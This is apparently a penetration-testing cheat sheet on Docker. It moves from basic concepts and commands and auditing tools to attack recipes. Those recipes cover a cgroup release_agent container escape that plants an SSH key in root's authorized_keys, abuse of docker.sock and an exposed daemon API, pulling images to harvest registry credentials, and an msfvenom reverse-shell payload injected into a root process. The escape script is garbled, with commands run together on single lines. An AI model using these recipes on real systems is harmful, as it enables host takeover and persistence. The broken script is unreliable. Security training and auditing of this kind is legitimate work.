
## Docker

### **Concepts**

* Docker Image
  * Read only file with OS, libraries and apps 
  * Anyone can create a docker image
  * Images can be stored in Docker hub \(default pu lic registry\) or private registry
* Docker Container 
  * Stateful instance of an image with a writable layer
  * Contains everything needed to run your application
  * Based on one or more images 
* Docker Registry
  * Repository of images
* Docker Hub
  * Public docker registry
* Dockerfile
  * Configuration file that contains instructions for building a Docker image  
* Docker-compose file
  * Configuration file for docker-compose
* Docker Swarm
  * Group of machines that are running Docker and joined into a cluster.
  * When you run docker commands, they are executed by a swarm manager.
* Portainer
  * Management solution for Docker hosts and Docker Swarm clusters
  * Via web interface
* Docker capabilities
  * Turn the binary "root/non-root" into a fine-grained access control system.
  * Processes that just need to bind on a port below 1024 do not have to run as root, they can just be granted the net\_bind\_service capability instead.
* Docker Control Groups
  * Used to allocate cpu, memory, network bandwith of host to container groups.

### **Commands**

```text
# Search in docker hub
docker search wpscan
# Run docker container from docker hub
docker run ubuntu:latest echo "Welcome to Ubuntu"
# Run docker container from docker hub with interactive tty
docker run --name samplecontainer -it ubuntu:latest /bin/bash
# List running containers
docker ps
# List all containers
docker ps -a
# List docker images
docker images
# Run docker in background
docker run --name pingcontainer -d alpine:latest ping 127.0.0.1 -c 50
# Get container logs
docker logs -f pingcontainer
# Run container service in specified port
docker run -d --name nginxalpine -p 7777:80 nginx:alpine
# Access tty of running container
docker exec -it nginxalpine sh
# Get low-level info of docker object
docker inspect (container or image)
# Show image history
docker history jess/htop
# Stop container
docker stop dummynginx
# Remove container
docker rm dummynginx
# Run docker with specified PID namespace
docker run --rm -it --pid=host jess/htop

# Show logs
docker logs containername
docker logs -f containername
# Show service defined logs
docker service logs
# Look generated real time events by docker runtime
docker system events
docker events --since '10m'
docker events --filter 'image=alpine'
docker events --filter 'event=stop'

# Compose application (set up multicontainer docker app)
docker-compose up -d
# List docker volumes
docker volume ls
# Create volume
docker volume create vol1
# List docker networks
docker network ls
# Create docker network
docker network create net1
# Remove captability of container
docker run --rm -it --cap-drop=NET_RAW alpine sh
# Check capabilities inside container
docker run --rm -it 71aa5f3f90dc bash
capsh --print
# Run full privileged container
docker run --rm -it --privileged=true 71aa5f3f90dc bash
capsh --print
# From full privileged container you can access host devices
more /dev/kmsg

# Creating container groups
docker run -d --name='low_priority' --cpuset-cpus=0 --cpu-shares=10 alpine md5sum /dev/urandom
docker run -d --name='high_priority' --cpuset-cpus=0 --cpu-shares=50 alpine md5sum /dev/urandom
# Stopping cgroups
docker stop low_priority high_priority
# Remove cgroups
docker rm low_priority high_priority

# Setup docker swarm cluster
docker swarm init
# Check swarm nodes
docker node ls
# Start new service in cluster
docker service create --replicas 1 --publish 5555:80 --name nginxservice
nginx:alpine
# List services
docker service ls
# Inspect service
docker service inspect --pretty nginxservice
# Remove service
docker service rm nginxservice
# Leave cluster
docker swarm leave (--force if only one node)

# Start portainer
docker run -d -p 9000:9000 --name portainer \
--restart always -v /var/run/docker.sock:/var/run/docker.sock \
-v /opt/portainer:/data portainer/portainer


# Tools
# https://github.com/lightspin-tech/red-kube
```

### Docker security basics

```text
# Get image checksum
docker images --digests ubuntu
# Check content trust to get signatures
docker trust inspect mediawiki --pretty
# Check vulns in container
- Look vulns in base image
- Use https://vulners.com/audit to check for docker packages
- Inside any container
cat /etc/issue
dpkg-query -W -f='${Package} ${Version} ${Architecture}\n'
- Using Trivy https://github.com/aquasecurity/trivy
trivy image knqyf263/vuln-image:1.2.3
# Check metadata, secrets, env variables
docker inspect <image name>
docker inspect <container name>
# Review image history
docker history image:latest
# Inspect everything
docker volume inspect wordpress_db_data
docker network inspect wordpress_default
# Interesting look in the volume mountpoints
docker volume inspect whatever
cd /var/lib/docker/volumes/whatever
# Integrity check for changed files
docker diff imagename
# Check if you're under a container
https://github.com/genuinetools/amicontained#usage
# Docker Bench Security (Security Auditor)
cd /opt/docker-bench-security
sudo bash docker-bench-security.sh
```

### Detect inside a docker or running containers

```text
- MAC Address
    - Docker uses a range from 02:42:ac:11:00:00 to 02:42:ac:11:ff:ff
- List of running processes (ps aux)
    - Small number of processes generally indicate a container
- CGROUPs
    - cat /proc/1/cgroup – should show docker process running
- Check for existence of docker.sock (ls -al /var/run/docker.sock)
- Check for container capabilities: capsh –print
- On Pentests, check for tcp ports 2375 and 2376 – Default docker daemon ports
```

### Escape NET\_ADMIN docker container

```text
# Check if you're NET_ADMIN
ip link add dummy0 type dummy
ip link delete dummy0
# If it works, this script execute 'ps aux' in host:
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/xecho 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agentecho '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmdsh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
# You can replace the 'ps aux' command for:
cat id_dsa.pub >> /root/.ssh/authorized_keys
```

### Attack insecure volume mounts

```text
# After get reverse shell in docker container (eg insecure webapp with RCE)
# This commands are executed inside insecure docker container
# Check if it's available docker.sock
ls -l /var/run/docker.sock
# This allows to access the host docker service using host option with docker client by using the UNIX socket
# Now download docker client in container and run commands in host
./docker -H unix:///var/run/docker.sock ps
./docker -H unix:///var/run/docker.sock images
```

### Attack docker misconfiguration

```text 
# Docker container with exposed ports running docker service
# Docker API is exposed in those docker ports
# Check query docker API with curl
curl 10.11.1.111:2375/images/json | jq .
# Then you can run commands in host machine
docker -H tcp://10.11.1.111:2375 ps
docker -H tcp://10.11.1.111:2375 images
```

### Audit Docker Runtime and Registries

```text
# Runtime

# Host with multiple dockers running
# Check docker daemon
docker system info
# Check docker API exposed on 0.0.0.0
cat /lib/systemd/system/docker.service
# Check if docker socket is running in any container
docker inspect | grep -i '/var/run/'
# Check rest of files docker related
ls -l /var/lib/docker/
# Check for any secret folder
ls -l /var/run/
ls -l /run/

# Public Registries
# Docker registry is a distribution system for Docker images. There will be diferent images and each may contain multiple tags and versions. By default the registry runs on port 5000 without authentication and TLS
# Check if docker registry is up and running
curl -s http://localhost:5000/v2/_catalog | jq .
# Get tags of docker image
curl -s http://localhost:5000/v2/devcode/tags/list | jq .
# Download image locally
docker pull localhost:5000/devcode:latest
# Access container to review it
docker run --rm -it localhost:5000/devcode:latest sh
# Once mounted we can check the docker daemon config to see user and registry
docker system info
# And we can check the registries configured for the creds
cat ~/.docker/config.json

# Private registries
# Check catalog
curl 10.11.1.111:5000/v2/_catalog
# Get image tags
curl 10.11.1.111:5000/v2/privatecode/tags/list
# Add the insecure-registry tag to download docker image
vi /lib/systemd/system/docker.service
ExecStart=/usr/bin/dockerd -H fd:// --insecure-registry 10.11.1.111:5000
# Restart docker service
sudo systemctl daemon-reload
sudo service docker restart
# Download the image
docker pull 10.11.1.111:5000/privatecode:whatevertag
# Enter inside container and enumerate
docker run --rm -it 10.11.1.111:5000/privatecode:golang-developer-team sh
cd /app
ls -la
```

### Attack container capabilities

```text
# Host with sys_ptrace capability enabled with host PID space. So it runs top command of host
# You're already inside container
# Check capabilities
capsh --print
# Upload reverse shell and linux-injector
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f raw -o payload.bin
# Check any process running as root
ps aux | grep root
./injector PID_RUNNING_AS_ROOT payload.bin
```

### Tools

```text
# https://github.com/anchore/grype
# https://github.com/aquasecurity/trivy
# https://github.com/cr0hn/dockerscan
# https://github.com/P3GLEG/Whaler
# https://github.com/RhinoSecurityLabs/ccat
```
